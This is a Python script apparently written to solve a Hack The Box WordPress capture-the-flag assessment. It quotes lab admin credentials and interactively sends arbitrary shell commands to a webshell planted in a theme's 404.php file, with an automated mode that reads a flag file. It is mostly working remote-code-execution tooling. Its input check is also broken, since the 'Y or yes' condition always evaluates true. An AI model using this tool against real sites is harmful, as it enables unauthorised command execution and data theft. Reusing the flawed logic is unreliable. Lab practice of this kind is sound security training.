"""
---------------------------
Skills Assesment - HTB Hacking WordPress
---------------------------

1. Use the credentials for the admin user [admin:sunshine1] and upload a webshell to your target. Once you have access to the target, obtain the contents of the "flag.txt" file in the home directory for the "wp-user" directory.

"""

# Import Request to send web request to the internet
import requests
import sys
import requests
# Module to display output in different colors.
from colorama import Fore, Back, Style
"""
Disable the display of certificate warnings when requests 
are made to websites using insecure certificates. This can 
be useful in scenarios where targeted web applications use 
self-signed certificates as is the case in the AWAE labs.
"""
requests.packages.urllib3.\
disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)


def main(app_guidance):
    """
    Main entry point:
    - validate CLI args
    - build request info
    - simulate (or actually perform) the request
    - format and print the response blocks
    """
    # If the script is ran without specify the target
    if len(sys.argv) != 2:
        print(f"In CLI, Usage should be: {sys.argv[0]} target")
        print(f"Example: {sys.argv[0]} 10.0.0.1")
        print(f"Example: {sys.argv[0]} manageengine")
        sys.exit(1)

    # Obtain taregt from CLI
    target = sys.argv[1].strip().rstrip('/')   # from CLI202
    
    if app_guidance == "automate":
        automate_rce(rce_target=target)
    else:
        # Get Attacker input on what they would like to do
        get_attacker_input(target)

def get_attacker_input(target):
    print("Would you like to test the remote code execution on the target?\n")
    attcker_input = input("Enter Y/N: ")

    if attcker_input in ["Y","yes","YES","N","no","NO"]:
        if attcker_input == "Y" or "yes" or "YES":
            # Test target injection
            test_injection(test_target=target)
        elif attcker_input == "N" or "no" or "NO":
            # RCE Execution on target
            remote_code_execution(rce_target=target)
    else:
        print("You did not enter the expected input, please try again")
        attcker_input = get_attacker_input(target)

    return attcker_input
def remote_code_execution(rce_target):
    # ============================ URL of TARGET ============================ #
    url = f"http://{rce_target}/wp-content/themes/twentyseventeen/404.php"
    
    cmd = input("Enter the Derised CMD to EXECUTE Remote Code Execution: ")
    cmd_injection = f"cmd={cmd}"

    send_request(url, cmd_injection)

def automate_rce(rce_target):
    # ============================ URL of TARGET ============================ #
    url = f"http://{rce_target}/wp-content/themes/twentyseventeen/404.php"
    # RCE for the FLAG
    cmd_injection = f"cmd=cat%20/home/wp-user/flag.txt"
    # ============================ Send Request ============================ #
    send_request(url, cmd_injection)


def test_injection(test_target):
    
    # ============================ URL of TARGET ============================ #
    url = f"http://{test_target}/wp-content/themes/twentyseventeen/404.php"
    
    cmd = input("Enter the Derised CMD to TEST Remote Code Execution: ")
    cmd_injection = f"cmd={cmd}"

    send_request(url, cmd_injection)

def send_request(target_url, target_cmd_injection):
    # ============================ Initiate the Request to Execute RCE on WP TARGET ============================ #
    try:
        # WARNING: verify=False disables TLS certificate verification.
        r = requests.get(target_url, params=target_cmd_injection, verify=False, timeout=10)
    except requests.RequestException as e:
        print(f"Request failed: {e}")
        sys.exit(2)

    print_response(response=r)

def print_response(response):
    r = response
    # ============================ FORMAT OUTPUT ============================ #
    print("\n======= Johnny Custom Exploit Development =======\n")
    print(format_text("REQUEST METHOD:", r.request.method))
    print(format_text("REQUEST URL:", r.request.url))
    print(format_text("REQUEST HEADERS,r.headers is: :", r.request.headers))
    print(format_text("REQUEST BODY (raw):", r.request.body))   # shows form-encoded body
    print(format_text("RESPONSE STATUS,r.status_code is:", r.status_code))
    print(format_text("RESPONSE COOKIES,r.cookies is:", r.cookies))
    print(format_text("RESPONSE CONTENT-LENGTH:", len(r.text)))
    print(format_text("RESPONSE (first 300 chars):\n", r.text))

def format_text(title,item):
  """
    Helper to create a nicely formatted console output block.

    - title: short label for the section (e.g. "r.status_code is:")
    - item: item to display (will be stringified)
    Returns a string that contains the title, a separator, the item, and a short marker.
  """
  cr = '\r\n'
  section_break = cr +  "*" * 20 + cr
  item = str(item)
  text = Style.BRIGHT + Fore.RED + title + Fore.RESET + section_break + item + section_break + '\t'
  return text

if __name__ == "__main__":
    app_direction = input("\nWould you like to test custom input against your target or just automate the RCE Attack? \n")

    while app_direction != "exit":

        if app_direction == "automate":
            main(app_direction)
        else:
            main(app_guidance=app_direction)
        
        app_direction = input("Would you like to execute the program again exit (enter 'exit' to stop program)")
    
    print("Thank you for using the tool")